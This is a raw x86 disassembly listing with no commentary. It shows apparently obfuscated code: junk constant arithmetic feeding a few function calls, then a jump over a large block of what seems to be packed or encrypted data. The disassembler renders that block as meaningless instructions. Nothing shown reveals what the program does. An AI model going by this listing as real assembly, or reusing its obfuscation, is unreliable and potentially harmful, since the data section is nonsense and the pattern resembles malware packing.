  40f9f7:	mov    DWORD PTR [ebp-0x8],0x3374
  40f9fe:	mov    DWORD PTR [ebp-0xc],0x3c31
  40fa05:	mov    eax,DWORD PTR [ebp-0xc]
  40fa08:	mov    edx,DWORD PTR [ebp-0x8]
  40fa0b:	mov    esi,DWORD PTR [ebp-0x4]
  40fa0e:	xor    eax,edx
  40fa10:	xor    edx,edx
  40fa12:	div    esi
  40fa14:	mov    edx,DWORD PTR [ebp-0x14]
  40fa17:	and    eax,edx
  40fa19:	sub    eax,0x680
  40fa1e:	mov    DWORD PTR [ebp-0x24],eax
  40fa21:	mov    DWORD PTR [ebp-0x30],0x5f68
  40fa28:	mov    DWORD PTR [ebp-0x2c],0x398b
  40fa2f:	mov    DWORD PTR [ebp-0x4],0x5034
  40fa36:	mov    DWORD PTR [ebp-0x8],0x7cbf
  40fa3d:	mov    DWORD PTR [ebp-0xc],0x4f6c
  40fa44:	mov    DWORD PTR [ebp-0x14],0xee2
  40fa4b:	mov    eax,DWORD PTR [ebp-0x14]
  40fa4e:	add    eax,DWORD PTR [ebp-0xc]
  40fa51:	mov    edx,DWORD PTR [ebp-0x8]
  40fa54:	xor    eax,edx
  40fa56:	mov    edx,DWORD PTR [ebp-0x4]
  40fa59:	or     eax,edx
  40fa5b:	mov    edx,DWORD PTR [ebp-0x2c]
  40fa5e:	or     eax,edx
  40fa60:	mov    edx,DWORD PTR [ebp-0x30]
  40fa63:	and    eax,edx
  40fa65:	mov    edx,0x5b68
  40fa6a:	sub    edx,eax
  40fa6c:	mov    DWORD PTR [ebp-0x24],edx
  40fa6f:	mov    DWORD PTR [ebp-0x48],0x3308
  40fa76:	mov    DWORD PTR [ebp-0x44],0x59a4
  40fa7d:	mov    DWORD PTR [ebp-0x38],0x2775
  40fa84:	mov    DWORD PTR [ebp-0x34],0x4da
  40fa8b:	mov    DWORD PTR [ebp-0x40],0x49d8
  40fa92:	mov    DWORD PTR [ebp-0x3c],0x1b5c
  40fa99:	mov    DWORD PTR [ebp-0x28],0x338c
  40faa0:	mov    DWORD PTR [ebp-0x24],0x68ed
  40faa7:	mov    DWORD PTR [ebp-0x20],0x2a7b
  40faae:	mov    DWORD PTR [ebp-0x1c],0x718f
  40fab5:	mov    eax,DWORD PTR [ebp-0x20]
  40fab8:	mov    edx,DWORD PTR [ebp-0x1c]
  40fabb:	mov    esi,DWORD PTR [ebp-0x28]
  40fabe:	mov    ebx,DWORD PTR [ebp-0x24]
  40fac1:	add    eax,0xffffc948
  40fac6:	adc    edx,0xffff87b0
  40facc:	or     eax,esi
  40face:	mov    esi,DWORD PTR [ebp-0x40]
  40fad1:	or     eax,esi
  40fad3:	or     edx,ebx
  40fad5:	mov    ebx,DWORD PTR [ebp-0x3c]
  40fad8:	mov    esi,DWORD PTR [ebp-0x38]
  40fadb:	or     edx,ebx
  40fadd:	mov    ebx,DWORD PTR [ebp-0x34]
  40fae0:	sub    eax,esi
  40fae2:	mov    esi,DWORD PTR [ebp-0x48]
  40fae5:	sbb    edx,ebx
  40fae7:	mov    ebx,DWORD PTR [ebp-0x44]
  40faea:	or     eax,esi
  40faec:	or     edx,ebx
  40faee:	add    eax,0x89b
  40faf3:	mov    DWORD PTR [ebp-0x20],eax
  40faf6:	adc    edx,0x5a
  40faf9:	mov    DWORD PTR [ebp-0x1c],edx
  40fafc:	mov    DWORD PTR [ebp-0x80],0xfa4
  40fb03:	mov    DWORD PTR [ebp-0x70],0x618e
  40fb0a:	mov    DWORD PTR [ebp-0x6c],0x811
  40fb11:	mov    DWORD PTR [ebp-0x98],0x42d6904a
  40fb1b:	mov    DWORD PTR [ebp-0x94],0xe82c1
  40fb25:	mov    DWORD PTR [ebp-0x88],0x58ff
  40fb2f:	mov    DWORD PTR [ebp-0x84],0x7394
  40fb39:	xor    eax,eax
  40fb3b:	inc    eax
  40fb3c:	mov    DWORD PTR [ebp-0x64],eax
  40fb3f:	mov    DWORD PTR [ebp-0x8],0x5f59
  40fb46:	mov    DWORD PTR [ebp-0x4],0x652b
  40fb4d:	mov    DWORD PTR [ebp-0xc],0xf43
  40fb54:	mov    DWORD PTR [ebp-0x14],0x22dc
  40fb5b:	mov    DWORD PTR [ebp-0x2c],0x45d4
  40fb62:	mov    DWORD PTR [ebp-0x30],0x28e1
  40fb69:	mov    DWORD PTR [ebp-0x7c],0x5e09
  40fb70:	mov    DWORD PTR [ebp-0x50],0x3910
  40fb77:	mov    DWORD PTR [ebp-0x3c],0x5c97
  40fb7e:	mov    DWORD PTR [ebp-0x24],0x6111
  40fb85:	mov    DWORD PTR [ebp-0x78],ecx
  40fb88:	mov    DWORD PTR [ebp-0x34],ecx
  40fb8b:	mov    DWORD PTR [ebp-0x44],0x207a
  40fb92:	mov    DWORD PTR [ebp-0x60],eax
  40fb95:	mov    DWORD PTR [ebp-0x8c],0x7840
  40fb9f:	mov    DWORD PTR [ebp-0x4c],0x6b0b
  40fba6:	mov    eax,DWORD PTR [ebp-0x30]
  40fba9:	or     eax,0x70c5
  40fbae:	add    eax,DWORD PTR [ebp-0x2c]
  40fbb1:	mov    ecx,DWORD PTR [ebp-0x14]
  40fbb4:	or     eax,ecx
  40fbb6:	mov    ecx,0xce40
  40fbbb:	sub    ecx,eax
  40fbbd:	mov    eax,DWORD PTR [ebp-0xc]
  40fbc0:	sub    ecx,eax
  40fbc2:	imul   ecx,ecx,0x7480
  40fbc8:	add    ecx,DWORD PTR [ebp-0x58]
  40fbcb:	mov    eax,DWORD PTR [ebp-0x8]
  40fbce:	push   ecx
  40fbcf:	mov    ecx,DWORD PTR [ebp-0x4]
  40fbd2:	lea    eax,[ecx+eax*1-0x1e6d]
  40fbd9:	mov    ecx,DWORD PTR [ebp-0x64]
  40fbdc:	xor    edx,edx
  40fbde:	div    ecx
  40fbe0:	mov    ecx,DWORD PTR [ebp-0x74]
  40fbe3:	lea    eax,[eax+ecx*1-0xa617]
  40fbea:	push   eax
  40fbeb:	mov    eax,DWORD PTR [ebp-0x88]
  40fbf1:	mov    ecx,DWORD PTR [ebp-0x84]
  40fbf7:	push   0x770a
  40fbfc:	push   0x2a0c
  40fc01:	push   ecx
  40fc02:	push   eax
  40fc03:	call   0x416c20
  40fc08:	mov    ecx,DWORD PTR [ebp-0x98]
  40fc0e:	mov    esi,DWORD PTR [ebp-0x94]
  40fc14:	push   esi
  40fc15:	push   ecx
  40fc16:	or     edx,0x615d
  40fc1c:	or     eax,0x455c
  40fc21:	push   edx
  40fc22:	push   eax
  40fc23:	call   0x422074
  40fc28:	mov    ecx,DWORD PTR [ebp-0x70]
  40fc2b:	mov    edx,DWORD PTR [ebp-0x6c]
  40fc2e:	xor    eax,ecx
  40fc30:	mov    ecx,DWORD PTR [ebp-0x20]
  40fc33:	mov    edx,DWORD PTR [ebp-0x1c]
  40fc36:	mov    esi,DWORD PTR [ebp-0x80]
  40fc39:	and    eax,0xb49
  40fc3e:	add    esi,0x629b
  40fc44:	lea    eax,[eax+ecx*1-0xfd]
  40fc4b:	xor    esi,0x4994
  40fc51:	push   eax
  40fc52:	lea    esi,[ebp+esi*1-0x3c93]
  40fc59:	call   0x41066f
  40fc5e:	mov    ecx,eax
  40fc60:	mov    eax,DWORD PTR [ebp-0x50]
  40fc63:	mov    edx,DWORD PTR [ebp-0x7c]
  40fc66:	sub    eax,0x161
  40fc6b:	xor    eax,edx
  40fc6d:	imul   eax,eax,0x5151
  40fc73:	jmp    0x40ff41
  40fc78:	fiadd  WORD PTR [edi-0x46]
  40fc7b:	rcr    DWORD PTR [edx],1
  40fc7d:	dec    esp
  40fc7e:	fisub  DWORD PTR [esi]
  40fc80:	out    dx,eax
  40fc81:	mov    bl,BYTE PTR [ebp-0x56a71690]
  40fc87:	mov    esp,0x18189e76
  40fc8c:	mov    esi,0x80181814
  40fc91:	fisttp QWORD PTR [esi-0x1f]
  40fc94:	lahf   
  40fc95:	int3   
  40fc96:	pop    ecx
  40fc97:	push   edi
  40fc98:	mov    ds:0xf491e72a,eax
  40fc9d:	scas   eax,DWORD PTR es:[edi]
  40fc9e:	pusha  
  40fc9f:	sub    al,0x18
  40fca1:	pop    esi
  40fca2:	adc    cl,cl
  40fca4:	sti    
  40fca5:	repz and eax,0xa192f93f
  40fcab:	inc    ebx
  40fcac:	lock dec edx
  40fcae:	into   
  40fcaf:	pop    eax
  40fcb0:	fisttp WORD PTR [edi]
  40fcb2:	out    dx,al
  40fcb3:	inc    esi
  40fcb4:	mov    dl,0x86
  40fcb6:	and    eax,0xd48f8f8e
  40fcbb:	cmp    DWORD PTR ds:0x69deac9f,edx
  40fcc1:	add    ebp,DWORD PTR [ecx]
  40fcc3:	mov    al,ds:0x344b9fb4
  40fcc8:	test   eax,0x77fe49c1
  40fccd:	js     0xf5aa9334
  40fcd3:	pop    esp
  40fcd4:	jo     0x40fcaf
  40fcd6:	jnp    0x40fcc2
  40fcd8:	not    edx
  40fcda:	fcmovnbe st,st(6)
  40fcdc:	dec    eax
  40fcdd:	pop    ss
  40fcde:	cmp    al,0xa9
  40fce0:	or     bh,0x3
  40fce3:	sbb    cl,dl
  40fce5:	xor    eax,0x71dd573a
  40fcea:	push   esp
  40fceb:	shr    DWORD PTR [ebx-0x587e3a8e],1
  40fcf1:	push   0x3be699a8
  40fcf6:	inc    esp
  40fcf7:	ds int 0xc4
  40fcfa:	jno    0x40fca0
  40fcfc:	adc    dh,dl
  40fcfe:	aas    
  40fcff:	aas    
  40fd00:	mov    ds:0x91315974,al
  40fd05:	add    ebp,ebx
  40fd07:	lea    edx,[eax]
  40fd09:	imul   esi,DWORD PTR [ecx+eiz*2],0xffffffc2
  40fd0d:	push   ss
  40fd0e:	repz push 0x26450f57
  40fd14:	mov    edx,0x704e2d7b
  40fd19:	iret   
  40fd1a:	mov    ebx,0x692331e5
  40fd1f:	cmp    al,0x28
  40fd21:	in     al,0x92
  40fd23:	fisubr DWORD PTR [eax]
  40fd25:	pop    eax
  40fd26:	inc    ebp
  40fd27:	inc    esi
  40fd28:	sub    BYTE PTR [esp+eax*8+0x5e],dh
  40fd2c:	cwde   
  40fd2d:	mov    al,0xa8
  40fd2f:	pop    esi
  40fd30:	and    ah,BYTE PTR [ecx-0xb56a6e5]
  40fd36:	cmp    eax,0x70992948
  40fd3b:	xor    eax,0x59094dc3
  40fd40:	cmp    BYTE PTR ds:0x2de3ea3,cl
  40fd46:	or     DWORD PTR gs:[ebx+0x121a9f9d],esi
  40fd4d:	loopne 0x40fd4c
  40fd4f:	mov    ?,eax
  40fd51:	jo     0x40fd29
  40fd53:	jecxz  0x40fdcc
  40fd55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd56:	aam    0x67
  40fd58:	jmp    DWORD PTR [esi]
  40fd5a:	fist   DWORD PTR [ebp-0x8]
  40fd5d:	jmp    0x9d0358a0
  40fd62:	jge    0x40fd24
  40fd64:	stos   BYTE PTR es:[edi],al
  40fd65:	jno    0x40fce8
  40fd67:	aas    
  40fd68:	out    dx,eax
  40fd69:	and    al,0xc4
  40fd6b:	hlt    
  40fd6c:	pusha  
  40fd6d:	jmp    0x8400:0x5f441978
  40fd74:	js     0x40fd3f
  40fd76:	ins    BYTE PTR es:[edi],dx
  40fd77:	int    0x31
  40fd79:	fsub   DWORD PTR [edi+0x73561b42]
  40fd7f:	call   0xc903:0x92a04433
  40fd86:	push   0xba2573d9
  40fd8b:	or     DWORD PTR [ecx+eax*2],0xffffffa2
  40fd8f:	aad    0x26
  40fd91:	fsubp  st(3),st
  40fd93:	and    eax,0xa10f9202
  40fd98:	(bad)  
  40fd99:	aas    
  40fd9a:	icebp  
  40fd9b:	pop    es
  40fd9c:	mov    dl,0x35
  40fd9e:	call   0x2eff2adc
  40fda3:	dec    esp
  40fda4:	sub    eax,0x3beae635
  40fda9:	sbb    DWORD PTR [ebp-0x32],0x1b9de6cb
  40fdb0:	add    BYTE PTR [esi-0x34],bh
  40fdb3:	xchg   DWORD PTR [esi+0x49a2229e],ecx
  40fdb9:	push   ebp
  40fdba:	pop    esp
  40fdbb:	loope  0x40fdba
  40fdbd:	jmp    0x40fe10
  40fdbf:	add    al,0xc5
  40fdc1:	fs inc edi
  40fdc3:	and    al,0xb7
  40fdc5:	mov    gs,WORD PTR [edx]
  40fdc7:	and    DWORD PTR [ebx],ebp
  40fdc9:	ins    DWORD PTR es:[edi],dx
  40fdca:	inc    edi
  40fdcb:	dec    ebx
  40fdcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdcd:	mov    edi,0x2a98ba0b
  40fdd2:	inc    ecx
  40fdd3:	mov    ds:0x57de72d8,al
  40fdd8:	xchg   edi,eax
  40fdd9:	mov    BYTE PTR [ecx+eax*1],0x7
  40fddd:	aas    
  40fdde:	pusha  
  40fddf:	pop    esp
  40fde0:	sub    al,0x5e
  40fde2:	xchg   BYTE PTR [ebp-0x65],bh
  40fde5:	sti    
  40fde6:	adc    eax,0x75f7f17d
  40fdeb:	retf   
  40fdec:	sahf   
  40fded:	dec    eax
  40fdee:	imul   ecx,DWORD PTR [edx+eiz*2-0x1192c455],0xffffffc7
  40fdf6:	and    esp,DWORD PTR [ebp-0x386a3c7d]
  40fdfc:	jg     0x40fdc1
  40fdfe:	jmp    0xbfa7d926
  40fe03:	inc    ebp
  40fe04:	outs   dx,DWORD PTR ds:[esi]
  40fe05:	cmp    dh,BYTE PTR [eax-0x11f78957]
  40fe0b:	ds and al,0x60
  40fe0e:	(bad)  
  40fe0f:	push   edi
  40fe10:	mov    edi,0xeeb87bbd
  40fe15:	xchg   ebp,eax
  40fe16:	and    BYTE PTR [ecx-0x5d],ch
  40fe19:	or     BYTE PTR [eax+0x6f08b9e],dl
  40fe1f:	stos   BYTE PTR es:[edi],al
  40fe20:	and    eax,DWORD PTR [edi+esi*8-0x19e898bc]
  40fe27:	(bad)  
  40fe28:	pop    esi
  40fe29:	jle    0x40fdc3
  40fe2b:	xchg   ecx,eax
  40fe2c:	jno    0x40fe3c
  40fe2e:	mov    al,0xdf
  40fe30:	rol    BYTE PTR ds:0xf9b919fa,0xa6
  40fe37:	push   ecx
  40fe38:	out    0x4d,eax
  40fe3a:	xlat   BYTE PTR ds:[ebx]
  40fe3b:	in     eax,dx
  40fe3c:	js     0x40fe40
  40fe3e:	sahf   
  40fe3f:	mov    edx,0xf4e3b484
  40fe44:	add    cl,BYTE PTR [eax+0x21]
  40fe47:	pop    ss
  40fe48:	nop
  40fe49:	inc    esi
  40fe4a:	add    al,0x3d
  40fe4c:	fs dec eax
  40fe4e:	cmp    esp,edi
  40fe50:	push   es
  40fe51:	adc    BYTE PTR [eax-0x39796b8c],ch
  40fe57:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40fe59:	retf   0x19ac
  40fe5c:	jb     0x40fea0
  40fe5e:	jle    0x40fe41
  40fe60:	xor    BYTE PTR [ecx],al
  40fe62:	cdq    
  40fe63:	xor    esp,ebx
  40fe65:	outs   dx,BYTE PTR ds:[esi]
  40fe66:	cmp    al,bh
  40fe68:	pop    ecx
  40fe69:	stos   BYTE PTR es:[edi],al
  40fe6a:	clc    
  40fe6b:	and    eax,0xb250643e
  40fe70:	out    0x37,al
  40fe72:	popf   
  40fe73:	in     eax,0x5f
  40fe75:	scas   eax,DWORD PTR es:[edi]
  40fe76:	sar    BYTE PTR [edx-0x4378b0c],cl
  40fe7c:	inc    ebx
  40fe7d:	mov    BYTE PTR [ecx],al
  40fe7f:	mov    bh,0x42
  40fe81:	icebp  
  40fe82:	mov    esp,0xf7640fd0
  40fe87:	sahf   
  40fe88:	addr16 cmp dh,bl
  40fe8b:	imul   edi,DWORD PTR [ebx-0x2ef0f004],0xffffffd2
  40fe92:	push   0xf
  40fe94:	cmp    DWORD PTR [ebp+0x6c901df4],eax
  40fe9a:	jl     0x40fe60
  40fe9c:	sub    eax,DWORD PTR [esi-0x26]
  40fe9f:	sub    cl,BYTE PTR [esi+0x5f]
  40fea2:	in     eax,0x33
  40fea4:	pop    ebx
  40fea5:	out    0xb3,al
  40fea7:	xor    al,0xe0
  40fea9:	daa    
  40feaa:	cmp    edx,DWORD PTR ds:0x74f22e9f
  40feb0:	out    dx,eax
  40feb1:	aad    0x8c
  40feb3:	adc    DWORD PTR [ebx-0x70],esi
  40feb6:	aad    0xf5
  40feb8:	fwait
  40feb9:	test   DWORD PTR [ebp+0x41],eax
  40febc:	push   esi
  40febd:	jge    0x40fe6a
  40febf:	push   eax
  40fec0:	mov    ds:0x4c8e8c53,eax
  40fec5:	push   0xffffffba
  40fec7:	adc    BYTE PTR [edi-0x16],0x1f
  40fecb:	mov    DWORD PTR ds:0x1bfeaa58,esp
  40fed1:	ins    DWORD PTR es:[edi],dx
  40fed2:	out    dx,al
  40fed3:	scas   eax,DWORD PTR es:[edi]
  40fed4:	push   edx
  40fed5:	pop    edi
  40fed6:	scas   al,BYTE PTR es:[edi]
  40fed7:	sub    al,0x38
  40fed9:	push   ds
  40feda:	pop    esi
  40fedb:	in     al,0x72
  40fedd:	adc    al,0xaf
  40fedf:	ss cmp al,0x60
  40fee2:	dec    ebp
  40fee3:	cmp    ebp,eax
  40fee5:	xchg   ebx,eax
  40fee6:	das    
  40fee7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fee8:	fisub  DWORD PTR [ecx-0x525ce0b2]
  40feee:	xchg   ebx,eax
  40feef:	in     eax,0xfb
  40fef1:	xor    eax,0xab0220dc
  40fef6:	(bad)  
  40fef7:	push   eax
  40fef8:	retf   
  40fef9:	or     edx,DWORD PTR [edi]
  40fefb:	xor    edx,DWORD PTR [ebx+0x6e]
  40fefe:	inc    esp
  40feff:	rcr    BYTE PTR gs:[ebp+0x53],cl
  40ff03:	inc    ecx
  40ff04:	jne    0x40ff4a
  40ff06:	push   ss
  40ff07:	lahf   
  40ff08:	cmp    BYTE PTR [eax-0x2e],al
  40ff0b:	pop    esi
  40ff0c:	icebp  
  40ff0d:	mov    esp,0xb4a8432b
  40ff12:	xchg   BYTE PTR [ecx-0x4a],ah
  40ff15:	movq   QWORD PTR [ecx+edi*4],mm7
  40ff19:	data16 cmc 
  40ff1b:	das    
  40ff1c:	pop    esp
  40ff1d:	sbb    sp,WORD PTR [ebp+0x5cd11973]
  40ff24:	ja     0x40ff63
  40ff26:	fs xchg edx,eax
  40ff28:	cmp    al,BYTE PTR [ebp+0x7bedb553]
  40ff2e:	outs   dx,DWORD PTR ds:[esi]
  40ff2f:	push   esi
  40ff30:	inc    ecx
  40ff31:	sbb    eax,0xbd1cd668
  40ff36:	sub    BYTE PTR [ecx-0x70],bh
  40ff39:	fsub   st(4),st
  40ff3b:	dec    edi
  40ff3c:	or     BYTE PTR [ecx+0x563beaa],ah
  40ff42:	add    DWORD PTR [ecx],edi
  40ff44:	add    BYTE PTR [eax],al
  40ff46:	xor    eax,0x40c2
  40ff4b:	xor    edx,edx
  40ff4d:	mov    esi,0x218f6c45
  40ff52:	div    esi
  40ff54:	cmp    ecx,eax
  40ff56:	jmp    0x410224
  40ff5b:	ss int 0x1f
  40ff5e:	jnp    0x40ff7a
  40ff60:	pop    ebx
  40ff61:	xor    bl,BYTE PTR [ebp+ebx*1+0xd7c73b9]
  40ff68:	mov    ebp,0x981dbe2d
  40ff6d:	sbb    BYTE PTR [eax],bl
  40ff6f:	mov    esi,0xb0181814
  40ff74:	rcr    DWORD PTR [esi+esi*8+0x23],1
  40ff78:	ret    0x991f
  40ff7b:	stos   BYTE PTR es:[edi],al
  40ff7c:	fld    st(4)
  40ff7e:	sbb    al,0x9c
  40ff80:	inc    ebp
  40ff81:	mov    ?,WORD PTR [edi+0x5d]
  40ff84:	sbb    al,0x6b
  40ff86:	sub    edi,DWORD PTR [eax+0xe]
  40ff89:	push   esi
  40ff8a:	pusha  
  40ff8b:	or     eax,0xe7bc6eb1
  40ff90:	dec    ebp
  40ff91:	mov    WORD PTR ds:0xbd2f1c37,ss
  40ff97:	sbb    al,0xc3
  40ff99:	sahf   
  40ff9a:	loop   0x40ffa0
  40ff9c:	push   DWORD PTR [edx-0x49]
  40ff9f:	inc    edx
  40ffa0:	frstor [edx]
  40ffa2:	loopne 0x40ffbd
  40ffa4:	push   es
  40ffa5:	adc    BYTE PTR [eax],ch
  40ffa7:	shl    BYTE PTR [edx-0x6b],1
  40ffaa:	sub    eax,0x803eda11
  40ffaf:	sub    eax,DWORD PTR [ebx-0x44c618bc]
  40ffb5:	jl     0x40ff50
  40ffb7:	icebp  
  40ffb8:	sub    DWORD PTR [esi-0x7ab19b4c],ebp
  40ffbe:	into   
  40ffbf:	fcomp  st(7)
  40ffc1:	add    ah,BYTE PTR [ecx]
  40ffc3:	push   esi
  40ffc4:	bound  esp,QWORD PTR [ebx+0x67]
  40ffc7:	adc    BYTE PTR [ecx-0x7a],ah
  40ffca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffcb:	out    0x13,eax
  40ffcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffce:	xor    al,0xa4
  40ffd0:	mov    ebp,0x98530ca7
  40ffd5:	call   DWORD PTR [ebx]
  40ffd7:	jae    0x41002c
  40ffd9:	rol    DWORD PTR [edi+0x78],1
  40ffdc:	cmp    dl,bh
  40ffde:	xchg   edx,eax
  40ffdf:	call   0x8c613294
  40ffe4:	push   edi
  40ffe5:	out    dx,eax
  40ffe6:	pop    esp
  40ffe7:	sti    
  40ffe8:	fadd   QWORD PTR [ebx+0x36e285ec]
  40ffee:	jmp    0xab5a:0xbb98b50e
  40fff5:	pop    ds
  40fff6:	xor    eax,0xd671fb7d
  40fffb:	aas    
  40fffc:	sti    
  40fffd:	inc    ebp
  40fffe:	pop    es
  40ffff:	test   DWORD PTR [esi+0x42470a3],edi
  410005:	js     0x40ffe3
  410007:	push   cs
  410008:	mov    ebx,0xd88658c7
  41000d:	adc    edi,ecx
  41000f:	jle    0x40ff93
  410011:	xor    DWORD PTR [edi],esp
  410013:	mov    bl,0x4a
  410015:	data16 lock int 0xe8
  410019:	hlt    
  41001a:	(bad)  [eax-0x6a7fbfd7]
  410020:	pop    ds
  410021:	iret   
  410022:	mov    edx,0xa33c0e5b
  410027:	ins    BYTE PTR es:[edi],dx
  410028:	add    DWORD PTR [ebx+0x5d],esp
  41002b:	or     eax,0x91eabe0e
  410030:	xor    DWORD PTR [edx+0x70],edx
  410033:	pop    ebp
  410034:	les    esi,FWORD PTR [esi+eiz*1]
  410037:	and    al,0x7b
  410039:	mov    ecx,0xefe56db1
  41003e:	cli    
  41003f:	cld    
  410040:	or     eax,0x40b8e097
  410045:	push   ebx
  410046:	or     ecx,DWORD PTR [ecx+0x3c]
  410049:	fs es sbb edi,eax
  41004d:	jno    0x40ffe5
  41004f:	add    esi,DWORD PTR [edi-0x1b560735]
  410055:	xchg   esi,eax
  410056:	test   al,0xc0
  410058:	test   eax,0x31d6cd70
  41005d:	(bad)  
  41005e:	cli    
  41005f:	es (bad) 
  410061:	xchg   esi,eax
  410062:	out    dx,eax
  410063:	sbb    al,0xed
  410065:	aas    
  410066:	mov    cl,0xa4
  410068:	outs   dx,DWORD PTR ds:[esi]
  410069:	std    
  41006a:	jne    0x410008
  41006c:	push   eax
  41006d:	sub    al,0x81
  41006f:	and    BYTE PTR ds:0xcd500b0e,cl
  410075:	jge    0x410047
  410077:	xor    eax,0xc7c933b3
  41007c:	test   eax,0xf4ff933a
  410081:	(bad)  
  410082:	mov    esi,0x95d8a184
  410087:	xlat   BYTE PTR ds:[ebx]
  410088:	iret   
  410089:	mov    DWORD PTR [edx-0x6decaf7b],esi
  41008f:	aas    
  410090:	push   ds
  410091:	repz or al,BYTE PTR [esi+0x56]
  410095:	shr    al,1
  410097:	scas   al,BYTE PTR es:[edi]
  410098:	push   ds
  410099:	ins    DWORD PTR es:[edi],dx
  41009a:	mov    DWORD PTR [ecx+0x70],ebp
  41009d:	inc    ebp
  41009e:	fstp   TBYTE PTR [ebp-0x63]
  4100a1:	jo     0x4100a9
  4100a3:	jns    0x4100ba
  4100a5:	sub    al,BYTE PTR [eax-0x641d8834]
  4100ab:	loopne 0x410033
  4100ad:	aaa    
  4100ae:	dec    esp
  4100af:	loop   0x410083
  4100b1:	cs or  al,0x96
  4100b4:	or     BYTE PTR [eax-0x18],dl
  4100b7:	cmp    DWORD PTR [ebx],0x840012e1
  4100bd:	jl     0x410092
  4100bf:	mov    ds:0x2bd6f8a1,eax
  4100c4:	mov    cl,0xde
  4100c6:	icebp  
  4100c7:	or     BYTE PTR [ecx-0x69d4e663],0x96
  4100ce:	jmp    0x4c080f79
  4100d3:	mov    cs,WORD PTR [edi]
  4100d5:	xchg   esp,eax
  4100d6:	test   DWORD PTR [ebp-0xd],esi
  4100d9:	mov    dh,0x58
  4100db:	mov    al,ds:0x851fd9f2
  4100e0:	cs int 0xd7
  4100e3:	and    BYTE PTR [eax+0x2c],0x5c
  4100e7:	or     al,0xb2
  4100e9:	cmp    dh,dl
  4100eb:	inc    esp
  4100ec:	or     BYTE PTR [ebx],0x7c
  4100ef:	xor    BYTE PTR ds:0xfa47877,0x2
  4100f6:	int3   
  4100f7:	aaa    
  4100f8:	mov    ds:0x6f67f065,al
  4100fd:	mov    ds:0xab0ab2e8,al
  410102:	aad    0x49
  410104:	loop   0x4100f7
  410106:	xchg   DWORD PTR [ecx],ebx
  410108:	test   al,0xc7
  41010a:	mov    bl,0xbe
  41010c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41010d:	fidiv  WORD PTR [ecx]
  41010f:	int    0x7e
  410111:	enter  0x5081,0x97
  410115:	and    esp,DWORD PTR [esi]
  410117:	push   cs
  410118:	jnp    0x410189
  41011a:	imul   ebp,DWORD PTR [edx+0x51],0xffffffd0
  41011e:	lahf   
  41011f:	dec    ebx
  410120:	mov    esi,0x76f63771
  410125:	repnz pop ebp
  410127:	sbb    cl,bh
  410129:	fxch   st(3)
  41012b:	mov    ah,0xf5
  41012d:	xor    al,0x97
  41012f:	mov    eax,ds:0x929bdb37
  410134:	stos   DWORD PTR es:[edi],eax
  410135:	adc    BYTE PTR [ebp-0x35ac9b69],cl
  41013b:	in     eax,0x92
  41013d:	repz or eax,0x66a94c31
  410143:	aaa    
  410144:	nop
  410145:	mov    al,0x6
  410147:	push   edx
  410148:	outs   dx,BYTE PTR ds:[esi]
  410149:	jb     0x410155
  41014b:	jbe    0x410147
  41014d:	sbb    bh,ah
  41014f:	or     edi,edx
  410151:	aad    0xa1
  410153:	(bad)  
  410154:	in     eax,0x24
  410156:	mov    ds:0x6ef3548,eax
  41015b:	mov    WORD PTR [edx+0x4c687fb4],ss
  410161:	mov    WORD PTR [ebp-0x46],ss
  410164:	or     eax,0x3bfe0af4
  410169:	sti    
  41016a:	stc    
  41016b:	ds inc eax
  41016d:	gs fwait
  41016f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410170:	mov    edx,0x38b752e9
  410175:	xchg   esp,eax
  410176:	add    DWORD PTR [ebp+0x22dbf9e7],0x2e01f846
  410180:	cmc    
  410181:	jo     0x410134
  410183:	inc    edx
  410184:	std    
  410185:	int3   
  410186:	cs popa 
  410188:	imul   eax,DWORD PTR [edi+0x8dd2543],0x3b
  41018f:	popf   
  410190:	jl     0x4101b6
  410192:	adc    edi,DWORD PTR [edx]
  410194:	xor    ah,dh
  410196:	fdivr  QWORD PTR [edx-0xa]
  410199:	pusha  
  41019a:	inc    ebp
  41019b:	mov    edi,0xe193606b
  4101a0:	mov    DWORD PTR [esi],ecx
  4101a2:	xchg   BYTE PTR [ebp+0x48],ah
  4101a5:	cmp    bh,BYTE PTR [ebp+eiz*1+0x9]
  4101a9:	ja     0x41012f
  4101ab:	cmp    DWORD PTR [eax+0x7b],eax
  4101ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101af:	add    eax,0xf27f8bfe
  4101b4:	fldcw  WORD PTR [ebp+0x69a218da]
  4101ba:	sbb    edi,DWORD PTR [edi]
  4101bc:	int3   
  4101bd:	arpl   WORD PTR [ecx-0x79],sp
  4101c0:	mov    ?,WORD PTR [esi]
  4101c2:	out    0x2e,al
  4101c4:	ret    
  4101c5:	mov    al,ds:0x2633109b
  4101ca:	sbb    BYTE PTR [edx],cl
  4101cc:	push   0xffffff87
  4101ce:	aaa    
  4101cf:	sub    DWORD PTR [esi+0x46],esi
  4101d2:	dec    edx
  4101d3:	ins    BYTE PTR es:[edi],dx
  4101d4:	xor    BYTE PTR [eax],0x61
  4101d7:	call   0xeaa5e9a5
  4101dc:	pusha  
  4101dd:	jp     0x41024c
  4101df:	cmp    dl,BYTE PTR [ecx+0x70]
  4101e2:	push   edi
  4101e3:	pusha  
  4101e4:	imul   esi,DWORD PTR [eax+ebp*8],0x730e8f59
  4101eb:	(bad)  
  4101ec:	std    
  4101ed:	scas   eax,DWORD PTR es:[edi]
  4101ee:	adc    esp,DWORD PTR [ebx+0x774aeeaf]
  4101f4:	pushf  
  4101f5:	add    al,0x93
  4101f7:	(bad)  
  4101f8:	adc    dh,al
  4101fa:	stos   DWORD PTR es:[edi],eax
  4101fb:	pop    edi
  4101fc:	adc    BYTE PTR [edx+0x71],0x3c
  410200:	iret   
  410201:	ja     0x410246
  410203:	inc    ecx
  410204:	test   BYTE PTR [eax-0x7d4bfa8f],bh
  41020a:	aas    
  41020b:	mov    cl,0x28
  41020d:	in     eax,0x29
  41020f:	cmp    dh,ch
  410211:	jb     0x410210
  410213:	add    edx,DWORD PTR [esp+esi*2-0x35]
  410217:	scas   eax,DWORD PTR es:[edi]
  410218:	popf   
  410219:	mov    ecx,0x6ec6c0c7
  41021e:	leave  
  41021f:	push   eax
  410220:	jp     0x41029d
  410222:	push   ebp
